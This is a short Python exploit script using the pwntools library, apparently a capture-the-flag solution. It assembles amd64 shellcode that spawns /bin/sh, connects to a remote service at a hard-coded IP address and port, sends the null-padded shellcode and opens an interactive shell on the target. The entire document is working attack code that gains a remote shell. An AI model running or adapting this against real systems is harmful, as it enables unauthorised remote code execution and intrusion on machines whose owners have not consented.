from pwn import*

context.arch = 'amd64'
shell_code = asm(shellcraft.sh())

p = remote('124.220.41.254', 12353)


p.send(shell_code.ljust(200, b'\0'))

p.interactive()
